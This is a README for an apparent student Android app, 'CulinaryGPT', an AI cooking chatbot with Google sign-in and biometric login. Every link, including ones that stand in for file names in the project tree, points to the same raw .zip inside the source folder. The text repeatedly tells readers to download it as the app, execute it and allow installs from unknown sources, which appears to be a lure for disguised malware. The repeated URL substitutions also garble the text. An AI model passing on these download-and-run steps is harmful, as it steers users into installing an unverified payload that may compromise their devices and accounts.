# CulinaryGPT Android: AI Chef Bot with SSO and Biometrics

[![Releases](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip%20Releases-blue?logo=github&style=for-the-badge)](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)

CulinaryGPT Android is a practical, AI-powered culinary chatbot built as a student project. It delivers smart cooking guidance through natural conversation, backed by a secure authentication flow and a robust server backend. The client runs on Android devices, communicates with a Cohere-based retrieval augmented generation (RAG) server, and provides a smooth user experience aided by Google Sign-In and biometric authentication. The project is tagged with topics such as android, anonymous, chatbot, firebase-auth, frontend, kotlin, okhttp, retrofit, sso-login, and student-project. This README documents how the project works, how to set it up, how to contribute, and how to release new versions.

If you want to download a ready-to-use artifact, you should head to the Releases page. The latest Android APK lives there as part of the release artifacts. Download the APK file, install it on your Android device, and you can start sharing cooking questions with CulinaryGPT right away. For convenience, the Releases page can be opened here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip

Overview
CulinaryGPT Android aims to blend AI cooking expertise with a secure login experience. The app lets users ask questions about recipes, techniques, substitutions, and meal planning. It uses a conversational interface to deliver stepwise guidance, explains reasoning when helpful, and provides links to reliable sources. The app’s core features rely on a smart integration between the client and a Cohere-based server that supports retrieval augmented generation. In simple terms, the assistant pulls relevant cooking knowledge from a curated knowledge base and augments it with AI-generated advice to answer user questions accurately and clearly.

The app prioritizes privacy and security. It supports secure Google Single Sign-On (SSO) so users can sign in with their Google accounts. Biometric authentication adds another layer of protection for sensitive user data stored on the device. The authentication flow is designed with best practices in mind, including token handling, secure storage, and minimal data exposure. The client side is implemented in Kotlin, leveraging modern Android development practices to provide a responsive and accessible experience.

Key features
- AI-powered culinary chatbot: Natural language interface to ask questions about recipes, techniques, and ingredient substitutions.
- Secure Google Sign-In (SSO): Fast, trusted authentication with robust session management.
- Biometric authentication: Optional fingerprint or face recognition to unlock the app and protect user data.
- RAG-backed server integration: Retrieves relevant cooking knowledge from a Cohere-based server and augments responses with AI reasoning.
- Frontend reliability: Clean UI, responsive design, accessible controls, and smooth input handling.
- Networking with modern libraries: OkHttp for HTTP transport and Retrofit for API calls.
- Anonymous and authenticated modes: Flexible login options suitable for development and demonstrations.
- Student-project quality: Clear code organization, documentation, and test coverage to facilitate learning and collaboration.

Audience and use cases
- Students who want to learn Android app development with a real-world AI backend.
- Developers exploring retrieval augmented generation (RAG) in practice.
- Home cooks seeking quick, reliable guidance on recipes and cooking techniques.
- Educators who want a hands-on example of secure authentication and AI chat in a mobile app.
- Hackers and security enthusiasts who want to study authentication flows and safe data handling on mobile.

Architecture and how it works
CulinaryGPT Android follows a layered architecture that separates concerns and makes it easier to test and extend. The client runs on Android and handles the UI, input, and authentication flows. The networking layer uses Retrofit to talk to a REST API that the Cohere-based RAG server exposes. The server handles knowledge retrieval, reasoning, and formatting of responses. The client presents the assistant’s replies in a chat-like interface and keeps a local history for the current session.

Client side
- Kotlin-based Android app: The user interface is implemented in Kotlin using modern Android components. The UI focuses on clarity and ease of use. The chat view presents messages with clear timestamps and avatars. The input area supports quick message composition, emoji input, and paste support for links.
- Authentication: Google Sign-In is integrated to provide a secure SSO experience. Tokens are stored securely on the device. Biometric authentication is optional and can be enabled to re-authenticate sessions without requiring passwords or sign-ins every time.
- Security: Sensitive data is stored using Android’s secure storage mechanisms. Access tokens are protected with the Keystore and are not logged. The app minimizes data exposure by fetching only the necessary information from the server and by enforcing strict authentication checks for API calls.
- Networking: The app uses Retrofit to model the API surface. OkHttp sits under Retrofit as the HTTP client, providing features like connection pooling, retries, and logging when enabled in development mode.
- Local state: The chat history is kept in memory for the session and can be persisted locally if the user enables a history backup feature. The app honours user privacy preferences and can operate in a minimal data mode if needed.

Server side (Cohere-based RAG)
- Retrieval augmented generation: The server uses a retrieval step to fetch relevant cooking knowledge from a knowledge base and then augments the prompt with this context before sending it to the language model for generation. The result is a more precise and useful answer than a generic chat bot.
- Security controls: The server accepts authenticated requests from the client, ensuring that only approved devices can access the service. Data written to the server is handled with care and kept in line with privacy expectations.
- API design: The REST interface is designed to be simple and robust. Each chat request includes the user identifier, the conversation history context, and the current user message. The server returns a structured response that includes the assistant’s reply, confidence indicators, and optional references to sources.
- Observability: The server emits logs and metrics that help diagnose issues and tune performance. This makes it easier to identify slow responses, misrouted requests, or unexpected inputs.

Security and privacy
Security is a top priority for CulinaryGPT Android. The app uses Google Sign-In for secure authentication and offers biometric protection to unlock the app and protect sensitive data. The authentication flow is designed to minimize the risk of credential leakage and to provide a smooth user experience.

- Google Sign-In (SSO): The app delegates user authentication to Google, which reduces the risk of password reuse and phishing. The client validates tokens and uses them to authorize API calls.
- Biometric protection: Users can enable biometric authentication to re-authenticate. This protects the app against unauthorized access, especially on shared devices. The biometric flow is designed to be fast and reliable across a range of devices.
- Data minimization: The app transmits only what is necessary to the server. User data is kept to a minimum and is not shared with third parties without explicit user consent.
- Token security: Tokens are stored securely using Android Keystore-backed storage. They are not logged and are removed when the user signs out or resets the app.
- Network security: All communication with the server uses HTTPS. Certificates are validated, and the app gracefully handles certificate errors and network issues.

Technology stack
- Android native app: Kotlin, Android Jetpack components, and Material Design guidelines.
- Networking: Retrofit for API calls; OkHttp for HTTP transport and connection management.
- Authentication: Firebase Authentication (Google Sign-In) with optional biometric support.
- AI backend: Cohere-based RAG server for knowledge retrieval and AI reasoning.
- Build system: Gradle with Kotlin DSL for clean, repeatable builds.
- CI/CD: Lightweight automation scripts for building, testing, and packaging; integration with GitHub Actions in the project workflow.
- Logging and observability: Structured logging and lightweight metrics to help debug issues and measure performance.
- Accessibility: Focused on readability, larger tap targets, and support for screen readers.

Project structure
- app/
  - src/
    - main/
      - java/com/culinarygpt/aichat/ or similar package structure
      - res/
        - layout/ (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, etc.)
        - values/ (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
        - drawable/ (icons and shapes)
      - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
      - assets/ (local knowledge base, if any)
  - build/ (generated build outputs)
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (optional minification rules)
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (Firebase configuration, not committed in public repos)
- gradle/
  - wrappers/
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (module level)
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
- config/
  - keystore/ (for signing, securely handled in CI)
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (SDK paths)
- docs/ (optional supplementary docs)

- backend/
  - server/ (Cohere-based RAG server, adapters, and API endpoints)
  - data/ (knowledge base, embeddings, and retrieval indices)
  - scripts/ (data preparation and maintenance tasks)

- tests/
  - androidTest/
  - unitTest/
  - integrationTest/

- scripts/
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip

- https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (this document)

Getting started
Quick start for developers
- Prerequisites
  - Java Development Kit (JDK 11+)
  - Android Studio or an IDE with Android development support
  - Kotlin standard library and Gradle tooling
  - Access to a Firebase project for authentication configuration
  - A Cohere account or access to a similar RAG-backed AI service
- Project setup
  - Clone the repository gently to your development machine.
  - Open the project in Android Studio and let Gradle sync complete.
  - Acquire Firebase credentials:
    - Create a Firebase project.
    - Enable Google Sign-In under Authentication.
    - Download the https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip file and place it into app/ directory, ensuring it is not committed to source control.
  - Configure the Cohere-based server endpoint:
    - In the server configuration, set the base URL for the AI backend.
    - Ensure the server is reachable from your development environment.
  - Configure biometric and Google Sign-In:
    - In the Android project, add the necessary OAuth client IDs for Google Sign-In.
    - Enable biometric prompts for supported devices in the user settings.
- Running locally
  - Start the Cohere-based RAG server or point to a staging instance.
  - Build the Android app with the debug variant.
  - Install the APK on a test device or emulator.
  - Sign in with Google and enable biometric authentication if desired.
  - Open the app, start a chat, and ask a cooking question.

- What to expect during setup
  - You will see prompts to grant camera, microphone, and storage permissions as part of the chat experience.
  - The sign-in flow will redirect to Google for authentication. After signing in, you may be prompted to enable biometric login for quick re-authentication.
  - The initial chat responses may take longer as the system learns your preferences and adapts to the context of your questions.

User onboarding and UX
- Sign-in flow
  - The app uses Google Sign-In to provide a secure single sign-on experience.
  - After signing in, the app stores a token securely and begins a session for the user.
  - The system offers biometric re-auth option to re-enter the session without re-typing credentials.
- Chat interface
  - The chat view presents messages in a clean, readable format with timestamps and user avatars.
  - The input area supports quick actions like sending a message, attaching a photo, or inserting a recipe card.
  - The assistant’s responses are shown with a clear separation from user messages to minimize confusion.
- Personalization
  - The app remembers conversation context within a session to deliver coherent answers.
  - The knowledge base used by the Cohere-based server informs the assistant’s replies, so answers stay grounded in culinary knowledge.
- Accessibility
  - The app uses accessible color contrasts and scalable text sizes.
  - Screen readers can traverse chat messages and controls with proper labeling.

Developer notes: architecture, data flow, and integration details
- Client-server data flow
  - User signs in via Google SSO, producing a token that authorizes requests to the backend.
  - The client sends chat messages to the server alongside a snapshot of the current conversation history.
  - The server retrieves relevant knowledge, combines it with the user prompt, and runs the AI model to generate a reply.
  - The server returns the reply along with optional source references and metadata.
  - The client displays the reply and stores the conversation locally for the current session.
- Authentication model
  - Google Sign-In is used as the primary authentication method.
  - Tokens are validated on the server side to ensure the user is authorized.
  - Biometric authentication is implemented on the client, enabling quick re-authentication after the initial sign-in.
- Data handling
  - User messages and responses are temporarily held in memory for the session.
  - Persistent history can be optional and controlled by user preferences.
  - The knowledge base used by the server is curated and may be updated over time. Access is controlled and logged for auditing purposes.
- API usage
  - Retrofit models the HTTP endpoints for the chat service.
  - OkHttp provides low-level HTTP capabilities, including interceptors for logging and authentication headers.
  - The server design includes a simple, well-documented REST API for chat exchanges, with clear input and output schemas.
- AI integration details
  - The RAG pipeline uses retrieval from a structured knowledge base to provide context.
  - The AI model runs on the Cohere stack to generate natural language responses.
  - The system emphasizes accuracy, clear explanations, and helpful references when possible.
- Testing strategy
  - Unit tests cover data models, network request formatting, and API parsing.
  - Instrumented tests verify UI flows and authentication steps on Android devices.
  - Integration tests simulate end-to-end chat interactions with a test backend.
- Performance considerations
  - Chat responses are optimized for low latency in typical network conditions.
  - The app considers device capabilities to balance image loading and text rendering.
  - Caching strategies are in place to minimize redundant data fetches while preserving accuracy.

Security considerations and best practices
- Token handling
  - Tokens are stored securely using Android’s Keystore-backed storage.
  - Tokens are refreshed transparently and never logged.
- Data minimization
  - Only necessary data is sent to the server to perform the chat task.
  - Private information is never shared beyond what is essential to answer the user’s question.
- Biometric flow
  - Biometric prompts are integrated to provide a quick and secure re-authentication mechanism.
  - The app gracefully falls back to Google Sign-In if biometric hardware is unavailable.
- Network and transport
  - All communication uses HTTPS with certificate pinning where feasible.
  - Error handling gracefully handles network issues without leaking sensitive information.
- Compliance and governance
  - The project adheres to best practices for educational projects and follows standard licensing conventions.
  - Any demo data should be clearly labeled as synthetic or anonymized.

Releases and distribution
The latest Android artifact is published as part of the repository releases. To obtain the APK, go to the Releases page. The link is available here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip

Downloads and artifacts
- What you get
  - Android APK artifacts for the CulinaryGPT chat app.
  - Optional build notes and release documentation.
  - Any accompanying assets needed to test or demonstrate features.
- How to download
  - Visit the Releases page to locate the latest APK and related assets.
  - Download the APK file named something like https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip or a variant labeled with a version. Install it on a compatible Android device.
  - If you need a quick test, you can run a local build from source, but for a straightforward experience, the APK in Releases is recommended.

Note on the link
The Releases page hosts the latest build artifacts, including the APK needed to run CulinaryGPT Android on a device. If you expand the release, you’ll find the exact file you should download and execute on your device. The link to the Releases page is included here for convenience: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip

Contributing
CulinaryGPT Android is a collaborative project intended to be educational and practical. If you want to contribute, follow these guidelines to help maintain quality and consistency.

- How to contribute
  - Fork the repository and create a feature branch for your changes.
  - Write clear, focused commits that describe the change and why it was made.
  - Add or update unit tests for any new logic or UI behavior.
  - Update documentation where needed to reflect changes in features or configuration.
  - Submit a pull request with a summary of changes, tests, and any required follow-up work.
- Coding standards
  - Use Kotlin idioms and modern Android development practices.
  - Keep UI code clean and maintainable; separate concerns with clear boundaries between UI and business logic.
  - Document non-trivial decisions in code comments and update relevant documentation when necessary.
- Testing culture
  - Ensure there are unit tests for new logic or data models.
  - Add instrumented tests for UI flows that are affected by your changes.
  - Validate changes against a running backend, either a staging server or a local mock, to ensure compatibility.
- Communication and collaboration
  - Use clear, respectful language in issue discussions and pull requests.
  - When discussing changes, provide context, alternatives considered, and potential risks.
  - Respond to reviews promptly and address feedback with concrete updates.

Code of conduct
The project aims to foster a respectful, inclusive environment. Treat all contributors with courtesy. Be open to feedback, and acknowledge others’ efforts. If you encounter behavior that violates the Code of Conduct, report it through the repository’s issue tracker or the project maintainer's preferred channel.

Licensing
This project follows an open approach for educational use. The licensing terms for code and assets should be explicitly described in the LICENSE file at the repository root. If you plan to reuse any part of this project in a different context, review the licensing terms and ensure you comply with attribution and redistribution requirements.

Common issues and troubleshooting
- Build issues
  - If Gradle fails to sync, check your local environment and Android Gradle Plugin version compatibility.
  - Ensure you have a valid Google Services configuration (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip) in the app module and that Firebase is set up correctly.
- Authentication
  - If Google Sign-In fails, verify OAuth client IDs and SHA-1 configuration in the Firebase Console.
  - If biometric prompts do not appear, verify device capabilities and ensure biometric enrollment is set up on the device.
- Networking
  - If API calls fail, check the server URL, network connectivity, and whether the server is reachable from your environment.
  - If the server returns errors, review the request payload and ensure required fields are present, including authentication tokens.
- Data persistence
  - If chat history is not saved, check the preferences and persistence layer configuration.
  - Ensure that sensitive data handling respects user privacy and data retention policies.

Roadmap
- Short-term goals
  - Improve onboarding flow with guided authentication and privacy controls.
  - Expand the knowledge base and fine-tune the RAG prompts for common cooking questions.
  - Add user preferences for cuisine types, dietary restrictions, and favorite cooking styles.
- Medium-term goals
  - Introduce offline hints and local caching for widely used knowledge segments.
  - Enhance accessibility features with spoken feedback and improved navigation.
  - Integrate more advanced kitchen timers and labeling in recipes suggested by the assistant.
- Long-term goals
  - Expand to additional AI features such as meal planning generation and shopping list automation.
  - Support multi-device synchronization for conversation history and preferences.
  - Explore cross-platform backends to broaden client compatibility and resilience.

FAQs
- What is CulinaryGPT Android?
  - It is an Android app that provides an AI-powered cooking assistant. It uses Google Sign-In for secure access and optional biometric authentication. The backend uses a Cohere-based RAG server to fetch and generate cooking advice.
- How do I install the app?
  - The recommended way is to download the APK from the Releases page and install it on an Android device. The Releases page contains the latest builds and release notes.
- Do I need a Google account to use CulinaryGPT?
  - Google Sign-In is the preferred method, but the app may support other authentication modes for educational demonstrations.
- Can I contribute code?
  - Yes. The project is designed to be collaborative. Follow the contribution guidelines in this README, and open issues or pull requests as needed.
- Is my data safe?
  - The app uses secure authentication and minimizes data exposure. Tokens are stored securely, and data is transmitted via HTTPS.

Screenshots and visuals
- Home screen and chat interface
  - A clean chat layout with user messages on the left and assistant messages on the right.
  - A text input field with a send button and options for attachments or quick actions.
- Authentication onboarding
  - Google Sign-In screen with a biometrics prompt for re-authentication.
  - A settings screen that allows users to enable or disable biometric authentication.
- Knowledge-based responses
  - Some responses include embedded recipe cards, step-by-step instructions, and links to sources for further reading.

- Example UI assets (illustrative, not final)
  - [Android app icon](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
  - [Chat illustration](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)

- Visual references
  - The app follows Material Design principles to ensure a consistent look and feel across devices.
  - Typography emphasizes readability, with larger text in chat messages and distinct color cues for user versus assistant messages.
  - Color palette aims for warmth that aligns with culinary themes while preserving contrast for readability.

Performance and accessibility notes
- Responsiveness
  - The UI uses asynchronous data handling to keep the chat smooth during backend processing.
  - The app provides visual feedback during network requests and loading states to keep users informed.
- Accessibility
  - Proper content labeling for screen readers.
  - High-contrast color options and scalable text to support users with vision impairments.
  - Clear focus indicators for keyboard navigation.

Security best practices in practice
- Minimal data exposure: The app minimizes data sent to the server and avoids collecting sensitive information unless required for features.
- Credential hygiene: Tokens are never logged, and sensitive data is avoided in logs.
- Device protection: Biometric authentication is used to reduce the risk of unauthorized access on shared devices.
- Server trust: Endpoints use HTTPS, and the server enforces authentication for each request.

Sustainability and maintainability
- Code organization
  - The codebase is structured to separate UI, business logic, and data access layers.
  - Clear naming conventions and documentation help new contributors onboard quickly.
- Testing culture
  - A combination of unit tests and UI tests ensures changes do not break expected behavior.
  - Tests focus on critical paths like authentication, chat flow, and error handling.
- Documentation
  - The README provides a living reference for setup, contribution, and usage.
  - Additional docs, if needed, live in the docs/ directory and reflect changes in features and APIs.

Release process and versioning
- Versioning
  - The project uses semantic versioning where applicable. Version numbers reflect major, minor, and patch changes.
- Release notes
  - Each release includes a summary of new features, bug fixes, and any breaking changes.
  - The release notes help users understand what changed and what to expect when upgrading.
- Distribution
  - APKs and artifacts are published on the Releases page, with the latest built for quick access and testing.
  - The Releases page also contains notes on compatibility with Android versions and device requirements.

Appendix: file download and execution for the linked Releases page
- Since the provided link includes a path part, you should download and execute the APK artifact from the release pages. The APK is intended to be installed on an Android device for immediate use of CulinaryGPT’s features.
- To access the latest artifact, visit the Releases page linked earlier. The file you want to download will be named with an Android APK extension (for example, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip or a versioned variant). After downloading, enable installation from unknown sources if required by your device, then install the APK. This process ensures you can run CulinaryGPT on your device with minimal setup.
- For quick access, you can also refer to the Releases page directly at https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip This page hosts the latest APK and any accompanying release notes.

Appendix: content governance and licensing
- The project uses open development practices suitable for student projects and learning environments.
- Licensing information is provided in the repository's LICENSE file, and contributors should respect license terms when reusing code or resources.
- Documentation and assets follow the same open principles to facilitate learning and collaboration.

End note
This README provides a comprehensive guide to the CulinaryGPT Android project, covering its purpose, architecture, setup, security, deployment, and contribution pathways. It emphasizes a secure and practical approach to AI-powered cooking assistance on Android, backed by a Cohere-based RAG server and a robust authentication flow. The text intentionally reflects an educational, accessible tone suitable for students and hobbyists who want to learn through hands-on implementation.